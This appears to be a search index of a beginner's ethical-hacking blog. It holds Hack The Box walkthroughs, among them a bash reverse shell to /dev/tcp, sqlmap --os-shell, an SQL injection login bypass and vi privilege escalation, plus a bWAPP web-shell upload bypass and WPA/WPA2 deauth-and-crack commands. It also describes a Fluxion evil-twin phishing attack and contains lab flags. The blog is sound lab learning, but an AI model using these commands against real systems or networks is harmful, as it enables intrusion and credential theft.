[[{"i":"welcome-to-my-blog","l":"Welcome to my Blog!"},{"i":"why-this-blog","l":"Why this Blog?","p":["The primary goal of this blog is to document my journey into cybersecurity and share valuable insights with others who are interested in the field. Whether you're new to this like me or someone with more experience, I hope you find the content here informative and helpful. \uD83D\uDE04"]},{"l":"What to Expect","p":["Although this blog is still tiny, hereâ€™s what you can look forward to:","Simple hacking techniques and practical examples done in my environment, documented for my own learning and for anyone else who might find them useful.","Useful tools and guides on how to configure and install them.","Will take up challenges in HTB (Hack The Box) and will write detailed guides on them and how they can be solved step by step.","All activities and techniques I present in this blog are performed in a strictly controlled and legal environment (at home). They are intended for educational purposes only and should not be used with any malicious intent. I strongly discourage any unlawful activities and emphasize the importance of ethical behavior."]},{"l":"Inspiration","p":["I got insipred to create this blog because of Lachezar Uzunov. He was my lecturer during a few Ethical Hacking courses. All I can say is that he is a professional and he is very good at what he is doing, so you can go and check out his work here :"]},{"l":"Connect with Me","p":["If you want to share your thoughts, ask questions or give me some advice, please feel free to connect :","Thank you for visiting, and I hope you enjoy your time here!"]}],[{"i":"configuring-bwapp-with-bee-box","l":"Configuring bWAPP (with bee-box)"},{"l":"What is bWAPP","p":["So, bWAPP (Buggy Web Application) is an intentionally vulnerable web application that developers, security professionals, students and basically everyone can use to practice and enhance their web security skills. It has a big range of security vulnerabilities and challenges, allowing users to explore and understand common web application security issues in a safe and controlled environment. I have been using it for some time now and I really love how much stuff you can practice with it.","Bee-box is just a custom linux VM which comes with bWAPP installed on it. It is extremely easy to set up one for yourself so you can play around with it. If you wish to get it, click here :","Setting it up","Download bee-box from the button above (.7z archive).","Extract it.","Load the .vmx file with your VMware Workstation (did you know that VMware Workstation Pro is now free for personal use?)","Start it.","That's all! Now you have a vulnerable VM which you can freely break \uD83D\uDE01.","In my future posts, I plan on executing a few simple attacks on a bee-box VM. Stay tuned if you're interested! \uD83D\uDC40"]}],[{"i":"crunch---wordlist-generator","l":"Crunch - wordlist generator"},{"i":"what-is-crunch","l":"What is Crunch?","p":["In this short post I will present the tool \"crunch\". What this tool does is generating a dictionary file based on your input. Yes, there are probably thousands of wordlists online but you can craft your own wordlist specifically tailored for your needs. In the Cracking WPA/WPA2 post, we have used one wordlist that came with Kali but in other cases we might need something more specific. This is where tools like Crunch come in handy.","Please remember, never use those tools for malicious purposes or without permission to do so."]},{"i":"how-to-get-the-tool","l":"How to get the tool?","p":["You can check the tool here :","However if you have a Kali Linux already, don't worry as it comes pre-installed."]},{"i":"how-to-use-crunch","l":"How to use crunch?","p":["When we type crunch in our terminal, we can see that it prompts us to add a \"min\" , \"max\" and some other options. Min and max are basically the minimum and maximum lenght of the strings that would be generated.","Let's try something. We will use \"crunch 1 4 1234 -o wordlist1.txt\". What this will do is that it will generate a combination of all numbers and will use length from 1 to 4. and it will output it to a file called \"wordlist1.txt\" Now as you can see, it generated 340 lines with different combinations with the numbers 1-4."]},{"l":"Using patterns to generate a wordlist","p":["So here comes the concern why you shouldn't use anything that makes sense for your password. Avoid using your names, birthdate, phone number or any personal information as your password. Don't even combine them to create a password!","Let's say your name is John Doe and you were born on 10th of January 1990. If someone knows this information about you, they can use it to generate a wordlist based on that.","We can try it out like that for example :","crunch -o john_doe.txt -p John Doe 10 January 1990","-p flag means that we will define a pattern for generating a wordlist.","-o flag is used to define the name of the output file","When using -p I haven't specified the min and max length because it won't affect the output since -p generates all possible permutations of the given words. Basically crunch will generate every possible way to arrange the provided words by us.","And that's not all, that's only us touching the surface of crunch with this small example. This tool is way more powerful and it has many more options. The point here is that you should avoid using stuff that make sense for your password as it could potentially lead to you being a victim of a targeted attack.","If you want to learn more about crunch, I would strongly recommend you to check the crunch manual. You can do so with \"man crunch\" in your terminal and do a few experiments of generating a wordlist for yourself."]}],[{"l":"Fluxion Setup"},{"i":"so-what-is-fluxion","l":"So what is Fluxion?","p":["It's a tool focused on obtaining a WiFi password via a phishing attack. If you've never seen it, you'll be surprised how easy it is to use. I will present this in another post but I will show you how to configure it in the current one.","It's very important that your adapter supports monitoring mode. For more information on that you can check my other post Cracking WPA/WPA2"]},{"i":"how-to-get-it","l":"How to get it?","p":["First you should go to your terminal and type :","sudo git clone https://www.github.com/FluxionNetwork/fluxion.git","Next step is to be in the directory where you have downloaded the tool.","Try to run it with sudo ./fluxion.sh","You will see the above window. It is quite possible that there are missing dependencies. To fix that you should run :","sudo ./fluxion -i","After you fix the dependencies everything should be working fine.","You don't need to navigate to the folder to start it every time. You can edit your shell configuration and make an alias for that so you can type \"fluxion\" and run it from everywhere. I really like to create aliases because it simplifies my work. \uD83D\uDE0E"]},{"i":"how-to-add-an-alias","l":"How to add an alias?","p":["First you need to edit your shell config file. In my case I am using zsh so I need to edit it the following way:","nano ~/.zshrc","At the bottom of the file I will add the following :","'# fluxion alias alias fluxion='cd /opt/fluxion/ && sudo ./fluxion.sh' ' You can adjust the path based on the location of fluxion in your case.","3. Save it. Now you can just type \"fluxion\" from anywhere in your environment \uD83D\uDC4D"]}],[{"i":"coming-soon-wip","l":"Coming soon (WIP)"}],[{"i":"1-fawn-tier-0","l":"1. Fawn (Tier 0)","p":["In this post I will be attacking a machine in HTB which is named Fawn. It is considered to be a very easy machine so I plan on starting with the simple ones first and gradually increasing the difficulty with my other posts. I will go through each task related to the machine and I will document it here."]},{"l":"Booting up and doing the tasks","p":["035db21c881520061c53e0536e44f815(We can see the flag in the file that we have managed to download from the ftp.)","21(very easy, if not sure you can always google that)","230(We can see that on the screenshot on task 8)","anonymous(Well that makes sense. Let's try this on our target) Seems to be working without a password.","File Transfer Protocol(that's was quite the easy one \uD83D\uDE0E)","First we will boot up the machine and get the IP address. Then after we are connected to the HTB VPN, we will check if we can ping it.","From your scans, what OS type is running on the target?","From your scans, what version is FTP running on the target?","ftp -h(Well that's an easy one)","get(That was very easy. Let's try it!)","Long story short SFTP provides encrypted file transfers over SSH.","ls(That was easy! Let's try it out)","Now comes the more interesting part \uD83E\uDD73","Now the first thing that comes to my mind is to scan the target with nmap. Of course I will use nmap with -sV flag. What this flag does is that it makes nmap to perform service version detection.","Now time to get working on the tasks! The first few will be quite easy with no real practice so keep scrolling!","ping(\uD83D\uDE34)","SFTP(still not feeling challenged so far \uD83E\uDD71)","Submit root flag","There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.","Unix(We can see that on the nmap scan on the previous step)","What acronym is used for the secure version of FTP?","What does the 3-letter acronym FTP stand for?","What is the command used to download the file we found on the FTP server?","What is the command we can use to send an ICMP echo request to test our connection to the target?","What is the command we need to run in order to display the 'ftp' client help menu?","What is the response code we get for the FTP message 'Login successful'?","What is username that is used over FTP when you want to log in without having an account?","Which port does the FTP service listen on usually?"]},{"l":"Summary","p":["After we have completed all tasks and we have gained the root flag, we have successfully pwned the machine. This seemed to be quite the easy one but as it was the first machine we have tested, it is kind of expected. I think this is a good exercise for beginners as some simple commands can be learned. Stay tuned for more!"]}],[{"i":"2-meow-tier-0","l":"2. Meow (Tier 0)","p":["In this post I will be attacking Meow in HTB. It is considered to be a very easy machine so let's see how it goes!"]},{"l":"Booting up and doing the tasks","p":["b40abdfe23665f766f9c61ecba8a4c19(We can see the flag when we ls and cat the file)","First we will boot up the machine and get the IP address and ping it as usual.","nmap(Of course!)","Now let's start with the tasks. The first tasks could be quite boring as they are only simple questions, so if you are bored, you can just scroll down!","openvpn(You can use either openvpn on your machine to connect by downloading a config from the website or you can do it via a machine provided by HTB if you prefer - think it is for a limited time only)","ping(\uD83D\uDE34)","root(What I've learned so far from the courses I've been taking is that we should always try users such as root, admin, administrator, etc.)","Submit root flag","telnet(We will do a nmap scan towards the host and see it)","terminal(Of course \uD83E\uDD71)","Virtual Machine(Obvious!)","What does the acronym VM stand for?","What is the name of the most common tool for finding open ports on a target?","What service do we identify on port 23/tcp during our scans?","What service do we use to form our VPN connection into HTB labs?","What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.","What tool do we use to test our connection to the target with an ICMP echo request?","What username is able to log into the target over telnet with a blank password?"]},{"l":"Summary","p":["Quite an easy machine, I think this is perfect for a beginner."]}],[{"i":"3-crocodile-tier-1","l":"3. Crocodile (Tier 1)","p":["In this post our target is Crocodile. Seems to be a very easy machine so let's get going!"]},{"l":"Booting up and doing the tasks","p":["-sC(This switch tells nmap to run some default scripts. As far as I am aware, these scripts are designed to perform various tasks like version detection, vulnerability detection, etc.)","-x(Had to look that up as it is not presented in the -h option of gobuster. Seems that we can learn something new even from the easiest machines \uD83C\uDF89)","230(We can see that when logged in as anonymous)","admin(Shocking, right? \uD83D\uDE0B)","After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?","After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?","anonymous(Already done in the previous step!)","Apache httpd 2.4.41(We can see that on the nmap scan we did previously on Task2.)","c7110277ac44d78b6a9fff2232434d16(We have managed to get that by going to http://10.129.86.22/login.php and logging in with admin username and one of the passwords that we got from the files in the FTP earlier)","First we will boot up the machine, get the IP address and ping it.","get(We did that during our previous machines.)","login.php(We found it by using gobuster with one of the wordlists that come with Kali + the -x flag from the previous step)","Now let's start with the tasks. The first tasks could be quite boring as they are only simple questions, so if you are bored, you can just scroll down!","Submit root flag","vsftpd 3.0.3(We can see that by running nmap -sC -sV 10.129.86.22)","What FTP code is returned to us for the \"Anonymous FTP login allowed\" message?","What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?","What Nmap scanning switch employs the use of default scripts during a scan?","What service version is found to be running on port 21?","What switch can we use with Gobuster to specify we are looking for specific filetypes?","What version of Apache HTTP Server is running on the target host?","Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?"]},{"l":"Summary","p":["Although this machine was easy, I've managed to learn about the -x flag used in gobuster. The machine was pwned and we have obtained the root flag."]}],[{"i":"4-appointment-tier-1","l":"4. Appointment (Tier 1)","p":["In this post our target is Appointment. From the description it seems that this is a DB related one."]},{"l":"Booting up and doing the tasks","p":["#(easy!)","404(We have all seen that \uD83D\uDE16 - https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)","443(easy!)","A03:2021-Injection( OWASP top 10)","Apache httpd 2.4.38 ((Debian))(We ran a Nmap scan to verify that)","Booting up the machine and pinging it. I will be using ParrotOS for this one instead of Kali (just testing).","Congratulations(check the description below) Now it is very important that we use admin'# instead of admin# as user for this to work. It took me some time to realise that. The single quote will let the SQL server know where the username ends, it's like we use a period in a sentence. If we don't use the quote, SQL will think that the user is \" admin#\". This was a bit tricky!","dir(we can check that with gobuster -h)","directory(another easy one!)","e3d0796d002a446c0e622226f42e9672(we got it after logging in)","Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?","If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?","sql injection(we all know that, don't we \uD83D\uDE0F)","Structured Query Language(easy!)","Submit root flag","Time for the tasks related to this machine.","What does Nmap report as the service and version that are running on port 80 of the target?","What does the acronym SQL stand for?","What is a folder called in web-application terminology?","What is one of the most common type of SQL vulnerabilities?","What is the 2021 OWASP Top 10 classification for this vulnerability?","What is the HTTP response code is given for 'Not Found' errors?","What is the standard port used for the HTTPS protocol?","What single character can be used to comment out the rest of a line in MySQL?"]},{"l":"Summary","p":["All tasks were pretty easy. However it took me some time to realise what is happening on step 10. Overall I think it is a nice machine for a beginner."]}],[{"i":"5-vaccine-tier-2","l":"5. Vaccine (Tier 2)","p":["We are moving to the Tier 2 machines from the very easy ones."]},{"l":"Booting up and doing the tasks","p":["--os-shell(This will instruct sqlmap to try spawning an interactive os shell if the SQL injection is exploitable)","(You can see that the IP is different but that is due to the fact I am continuing this at another day so the spawned VM has changed its address.)","After a lot of struggle we are finally in and we can try our command as sudo\uD83D\uDE35","And then I'll run : bash -c \"bash -i >& /dev/tcp/10.10.14.245/1337 0>&1\"(basically it should open an interractive shell towards my host)","anonymous(I have learned that we always need to give \"anonymous\" a try)","backup.zip(as seen on the previous screenshot, backup.zip can be downloaded from the FTP)","Besides SSH and HTTP, what other service is hosted on this box?","dd6e058e814260bc70e9bbdef2715849(found at the end of task 7)","ec9b13ca4d6229cd5cc1e09980965bf7(found at the start of Task 7)","First we found the password hash from one of the files in the zip after we have cracked the zip pass in the previous step. Then we ran john + rockyou wordlist against that hash that we have stored in hash.txt","FTP(we found it with a default nmap scan)","I found some flag but I think this is the answer for the next step.","My shell constantly breaks at this point and doesn't work well. I can't even properly see the contents of the file that we can edit as sudo. There are privilege escalation exploits via vi so we would want to try that. However first I need to have a stable connection. If we go back to the nmap scan we can see that we have ssh opened, so that's right, I will try to ssh for more stable connection.","Now the last task is to find the root flag. So far as per my observations the flags are mostly hidden in .txt files. What I am going to do to save myself some manual navigation as I did when finding the user flag, I will just type the following : find / -type f -name \"*.txt\". That way I will just see all the .txt files under the / directory.","Now we are going to do the tasks.","Now we got the shell :","Okay seems to be working now. So we got to find an exploit for that.","qwerty789","Seems that the target is vulnerable and we got an os-shell.","So first thing to do is to start our burp and capture the request.","So we had to find some password so we can \"sudo -l\". Took me probably like 30 minutes to cat around files but found this in the end:","Submit root flag","Submit user flag","The os-shell is kind of broken and doesn't work well so we will try to open a reverse shell. I'll set up a listener on my machine:","This is a great example I found: https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e. As per this post it seems that we can spawn ourselves a shell through vi as it is already running as root. (:!/bin/bash)","This service can be configured to allow login with any password for specific username. What is that username?","vi(check how we found it with the steps below, took me a while)","We have managed to log in with admin/qwerty789 on the available webpage","We have started the machine and checked if it is accessible.","We will run our command the following way, using --batch so we can put sqlmap into non-interactive mode which means it will use default options for prompts.","Well it took me only a few minutes of manual scrolling to find that \uD83D\uDE02. Way better than the last time I guess.","What I'll do now is save this request to a file called \"sqli.req\". The thing I'll do with the file is that I will run a sqlmap on it so it will basically test all fields automatically. I've learned that sometimes it is way better to do that since there could be more complex scenarios where it will be a bit challenging to specify in the url if we used one instead.","What is the name of the file downloaded over this service?","What is the password for the admin user on the website?","What option can be passed to sqlmap to try to get command execution via the sql injection?","What program can the postgres user run as root using sudo?","What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?","zip2john(a very nice tool that generates a hash from a pw protected archive) We have taken the hash with the tool. We have ran john to find the password of the zip:"]},{"l":"Summary","p":["Well what can I say. It took me a while, had to work on this machine for 2 days to complete it. In my opinion this isn't a \"Very Easy\" machine. Was quite interesting but I don't think it's even comparable to Fawn for example \uD83D\uDE02. Took some research but I can say that I have learned a lot of new things. While it might be \"Very Easy\" for a professional, I can definitely say that it was a bit of a challenge."]}],[{"i":"unrestricted-file-upload-medium-security-level","l":"Unrestricted File Upload (medium security level)","p":["How to configure Bee box for your own use"]},{"l":"Getting started","p":["In this post I will present a way to exploit the unrestricted file upload vulnerability in bWAPP(bee box). I will be using medium security level so I can show you how you can bypass it. If the security is low, basically there are no blocked extensions so you can directly upload a webshell. In our case there are restrictions. You can see on the below screenshot that we are unable to upload our php-backdoor.php file.","Of course! Why would they allow you to upload a php file in a place where images are required, right?","Well there are some extensions blocked, but not all of them are \uD83D\uDE0F."]},{"i":"step-1---uploading-an-allowed-file","l":"Step 1 - Uploading an allowed file","p":["I will upload a .png file. However the trick here is, that I will intercept the request with Burp and this is where the magic will happen."]},{"i":"step-2---intercepting-the-request-with-burp","l":"Step 2 - Intercepting the request with Burp","p":["Before I press Upload, my Burp proxy will be running as well as my Burp.","So here is my request before and after being edited.","What did I change?","Well as you can see we have changed the extension of the file first. We have added .phtml in the end of the file. This extension typically will indicate a file containing PHP code but embedded within HTML. Some web servers may recongize that as a PHP file and process it, just as in our case.","The next thing I did was putting the PHP code along with the image data. This code is a very simple command injection payload. It would allow us to execute system commands.","Now when we forward the request, the server will accept it as there is no .php extension at the end of the file."]},{"i":"step-3---navigating-to-our-malicious-file-and-executing-commands","l":"Step 3 - Navigating to our malicious file and executing commands","p":["Now when we click on the file, we are led to this page showing us an error that it cannot execute a blank command.","Well, we can just append ?cmd= at the end of our url and write our system command. By adding this to the URL, this would allows us to pass a command to our web shell which we have embedded in the uploaded file, which then will be executed on the server.","Here's another command that allows us to list the files in the current directory. We can even see some .php shells that I have uploaded previously while I was playing around. They could pass as the security was put to low.","And a \"pwd\" one so we can see the current working directory."]},{"l":"Conclusion","p":["In conclusion, I can say that unrestricted file upload in web applications could be very dangerous. Developers should really make sure that the files are being checked properly before upload. If such vulnerability is present, attackers can gain control over the server and potentially steal sensitive data.","This was a quite enjoyable exercise to do in Bee box so I am planning on doing more in the future. Stay tuned if you are interested \uD83D\uDC40."]}],[{"i":"cracking-wpawpa2","l":"Cracking WPA/WPA2"},{"l":"Introduction","p":["While there are many resources available on this topic, I wanted to present it in my own way for better clarity and understanding, and to have it as a future reference for myself as well \uD83D\uDE07.","Please remember, never perform these actions on networks you do not own or have explicit permission to test."]},{"l":"We need to put our wireless interface in monitor mode first"},{"i":"whats-monitor-mode-why-do-we-need-that","l":"What's monitor mode? Why do we need that?","p":["Monitor mode would allow our WiFi card to listen to all wireless trafic and not just the data addressed to us. This is essential for capturing important information like the WPA/WPA2 handshake for example, which we will show later."]},{"i":"do-all-adapters-support-monitor-mode","l":"Do all adapters support monitor mode?","p":["Nope! It really depends on the hardware and the driver of the adapter. Before proceeding, it's good to check if your WiFi adapter is compatible. Many people use external USB adapters that support monitor mode, and there are some really cheap ones available online. You can find a lot of information about compatible adapters, but I suggest looking into the following resources :","I have one really old laptop that luckily has an adapter (Atheros AR9485) that supports it and I use it for testing. I also have one external adapter which I got for around $10 some time ago but I won't be using it for the current post, maybe at a later stage \uD83D\uDE0E."]},{"l":"Putting my adapter into monitor mode","p":["First we can see that our adapter is \"wlan0\" after using \"iwconfig\" and it is in Mode: Managed.","Now after using sudo airmon-ng start wlan0 we can see how the adapter changed its name to \"wlan0mon\" and its mode to \"Montior\".","That's it. Quite simple isn't it? Now our adapter can capture the needed information."]},{"l":"Capturing the 4-way authentication handshake","p":["If you don't know what 4-way handshake is, this is simply the series of messages that are being exchanged between your device and the network so a secure connection can be established. While it is designed for a secure authentication, we can still capture that and we can attempt to crack it which can lead to us gaining unauthorized access to the network. \uD83E\uDD16"]},{"l":"Scan for the target","p":["We should now use sudo airodump-ng wlan0mon. This would show us the nearby networks and some details related to them. As you can see on the above screenshot, we have identified our target and we know which channel it uses + its MAC address as well."]},{"l":"Select the target and capture the handshake","p":["Next, we need to capture the handshake from our target WiFi network. To do this, we'll use the airodump-ng command. In this example, we're targeting a network on channel 7 with a specific BSSID (32:DE:4B:47:85:8F). The captured data will be saved to the desktop and then we can continue further.","sudo airodump-ng -c 7 -w /home/user/Desktop/capture -d 32:DE:4B:47:85:8F wlan0mon","-c we select the channel of the network we would like to attack","-w the path of our capture file","-d MAC address of the access point","wlan0mon our adapter which is now in monitor mode","We got all the above information from our first step which was to scan the nearby networks.","Now we will see the above window after executing the command. Once a device tries to connect to the AP, we will capture the handshake."]},{"i":"but-what-if-there-are-no-devices-that-want-to-connect-to-the-network-at-the-current-moment","l":"But what if there are no devices that want to connect to the network at the current moment?","p":["We can easily force the ones that are already connected to try to reconnnect to the access point and then we can capture the handshake.\uD83D\uDE09","We will send some messages to the clients, which are basically going to tell them that they are no longer associated with this access point. This will make them try to reconnect and it would let us capture the handshake."]},{"l":"Executing a deauthentitcation attack","p":["First we will connect the \"victim\" to the test network which we are using for the attack.","Now that we have the needed details from the first scan we can proceed further with the following command :","sudo aireplay-ng --deauth 0 -a 32:DE:4B:47:85:8F wlan0mon","aireplay-ng this tool is a part of the aircrack-ng suite as well as the other which we have used so far","--deauth 0 this specifies that we want to do a deauthentication attack, 0 simply means that packets will be sent until manually stopped","-a MAC address of the access point","wlan0mon our adapter which is now in monitor mode","With an additional flag \"-c\" we can specify a client that we want to deauth from the network. You will usually get a list of the clients on the previous steps but in our case we will just do it without it as our test network has only 1 device connected to it. As you can see in the disclaimer on the below screenshot, it is said that this attack is more effective if we specifically target a client that is connected to the network.","Now what happens after executing this attack is that our phone got disconnected from the network. When we stop the deauth attack, the phone will automatically connect back and in the window where we are waiting for the handshake, we will see a sign that it is collected."]},{"l":"Cracking the handshake","p":["Now that we got the .cap file that contains the handshake, we can try to crack it.","sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt","We just have to use aircrack-ng, the .cap file and a wordlist. In this case you can see that I am using \"rockyou.txt\" which is a wordlist included in Kali Linux. You can use whatever you like as a lot of wordlists are widely available on the internet. Or you can maybe even generate one yourself. Thinking about it, I might create a simple guide for that in the future \uD83D\uDE0E.","As you can see, after we have executed the command it took only 6 seconds to crack this password. Aircrack uses each password in our wordlist as a key to attempt to decrypt the encrypted handshake information.","And as you can observe above, we were able to connect to this network with the provided password."]},{"l":"Opening the .cap file in Wireshark to see each step of the handshake","p":["If you find it interesting, you can open this .cap file with Wireshark. That way you can observe the authentication process between the client and the AP. You can see the individual hanshake messages which have been exchanged during the authentication process.","It's very straightforward, all you have to do is open Wireshark, open the file :","Next filter for \"eapol\" (Extensible Authentication Protocol over LAN) packets. When a device tries to connect to a WiFi network, it needs to prove its identity to the access point (the router). EAPOL packets are like the 'handshake' between the device and the access point during this authentication process."]},{"l":"Protecting yourself","p":["A few tips that I follow to protect myself :","I would say that this is a must. Make sure the password combines uppercase with lowercase letters, numbers and even special characters. It would be significantly harder to crack one as it is going to be more resistant to dictionary-based attacks. Plus I wouldn't use any common words \uD83D\uDE01","WPA3 provides stronger encryption and authentication protocols compared to previous standards like WPA and WPA2 (had to downgrade mine to WPA2 for the simulation \uD83D\uDE04). It introduces the Simultaneous Authentication of Equals (SAE) protocol, which protects against various types of attacks, including brute-force and dictionary attacks.","Restrict the access to your WiFi network by only allowing devices with specific MAC addresses to connect to it. Yes a MAC address can definitely be spoofed but in my opinion it would add an additional barrier. I would like to make it as annoying as possilble if anyone is attempting to breach into my home network \uD83D\uDE09."]}],[{"i":"mitm-wpawpa2-attack---fluxion","l":"MITM WPA/WPA2 attack - Fluxion"},{"l":"Introduction","p":["In this post I will be simulating an attack with Fluxion on my own test network at home. The goal is to present how we can simulate a rogue access point, tricking unsuspecting users into revelaling their WiFi credentials to us. If a hacker cannot crack your handshake, he can use tools like fluxion that are using social engineering to steal a password. I will be using my laptop which I have used in Cracking WPA/WPA2. If you want more information on adapters you can check that post as I have shared some details there.","Please remember, never perform these actions on networks you do not own or have explicit permission to test."]},{"l":"We need to start our fluxion first","p":["If you want to find out how to configure your fluxion I recommend checking my guide for that - Fluxion Setup","When we first start our fluxion we are first presented with a language option to select :","After we select the language, we need to select another option. We have 2 of them, one is to create a Captive Portal or an \"evil twin\" where the victim will connect and the other one is a Handshake Snooper. So in order to create an evil twin, we need to first use the Handshake Snooper as we need the handshake because it will be used later for password verification (don't worry everything is semi-automated here so it's quite easy to do)."]},{"l":"Capturing the handshake","p":["We need to select a channel now, I will go with All channels (2.4GHz). In our case I know that my TestNetwork is 2.4GHz (7 channel) as I have configured it that way. There is a device already connected to it so it should be quite easy to get the handshake.","A scan will pop up so after we see our targeted network populated, we will stop the scan and select the network - in our case TestNetwork.","Now we need to select the interface which will be using. In my case I have only 1 which is my internal adapter.","Now as I did in Cracking WPA/WPA2, I will deauthenticate the devices on this network to speed up the process so I will go with the third option. I am going with it as I have had more success with the mdk4 method of deauthentication.","Now we need to select a method of verification for the hash. Fluxion seems to be recommending cowpatty so let's try that.","Will go with every 30 seconds, want to speed it up a bit.","Now we will go with Asynchronous verification. What does that mean? The difference between the two is that during the Asynchronous verification, multiple verifications processes run in parallel, which can make the attack faster. In synchronous however, processes run one after the other in a sequence, which would be slower.","A few windows will pop up showing you the processess that are happening and one of them being the deauth packets being sent. So what happened is that my phone which was connected to the network got disconnected and upon trying to connect back again automatically, the handshake was captured."]},{"l":"Creating an evil twin with the captured handshake","p":["Now as we have it saved to the fluxion's database, we can go back and do another attack, which is the Captive Portal.","Again, we have to do the scan and select our test network.","Once again, we will select our adapter as it will be needed to create that \"evil\" access point.","Then we have to select our method of authentication, which will be used to deauthenticate the devices on the network while spawning the evil access point. We will go with mdk4 again.","Next step is to pick a tool for the AP. We will go with hostapd as I've read it is more stable and can handle multiple connections. (I've tested it with 2 phones and it really did handle them)","As in one of the previous steps, we will go again with cowpatty that will be our password verification method, which will basically compare the user key to the handshake. So here comes the question what happens if the user types a wrong password on the fake AP? Well the tool will compare the password to the handshake which we have captured earlier so if the password is not correct, the user will continue to be prompted. In case the password is correct, the AP will shutdown and everything will go back to normal so the user won't find out that he was basically tricked.","Now we will use the hash that we have captured earlier for the evil twin AP. [1]","As in the previous step we will use the hash verification to be cowpatty (will stick to it as it is recommended).","Next step is to generate a captive portal. Basically this portal will look very real and once the user connects to the fake AP, he will be presented a portal which will bait him to type in the network password. We will create an SSL certificate so it looks more legit.","At this step we will use the \"disconnected\" which won't provide access to the internet to our victim once he connects to our fake AP.","This part is really, really cool. We can select from a ton of interfaces for a bait. I will go with a Generic one in Bulgarian language for this test. There are 79 different portal versions currently.","Now what we see are a bunch of windows doing different things. There is a DNS server, redirecting all request to the attacker's host portal. A web server that is serving the portal to the victim. Also we got a jammer (the red one) that will continue sending deauth requests to drop all clients from the original AP. So what will happen now is tht all authentication attempts at the fake portal will be checked against the handshake we got earlier. Once everything is ready, all services will be terminated nd we will get the key.","Now we wait."]},{"i":"what-happens-next-when-the-victim-connects","l":"What happens next when the victim connects?","p":["From the perspective of our victim, we can see the following - 2 networks with the same name, the first one is unlocked (evil twin one) and the victim is not able to connect to the second one (the real network) as it is being deauthenticated constantly:","The victim will be redirected into the browser to our fake portal page. So basically this message tells the victim that for security reasons, it is needed to enter the password to gain access to the internet.","Now as the victim enters the password a message appears that the connection will be recovered in a few seconds."]},{"l":"Getting the password on our end","p":["So when the victim connected to our rogue AP first, we have noticed that in some of the terminal windows that have appeared. It looks like that the victim is being redirected to the portal and we can see it on the DNS Service and Web Service windows.","Once the victim entered the password in the fake portal, a window appeared that told us where the password got saved.","And there we have it."]},{"l":"Conclusion","p":["The goal of this simulation was to present how vulnerable we can be to targeted attacks. By creating a rogue access point, attackers can trick people into revealing their WiFi passwords, which will grant them unauthorized access to the network. It's very important for us to understand how those methods work so we can recognize such an attack.","Always enable WP3 encryption if supported. It offers stronger security features that can protect against many common attacks.","Regularly update all of your devices including the firmware of your router. For example I have tried to connect to this network from one phone which has the latest updates and it didn't work. However I have tested 2 other phones which have not been updated in a while and guess what? Both of them were able to connect to the evil twin network.","Believe me, such an attack can easily work in real life, especially if the victims are people who are not aware of these types of security threats.","Stay informed, stay secure and be sure to inform the people around you. \uD83D\uDE0E"]}]]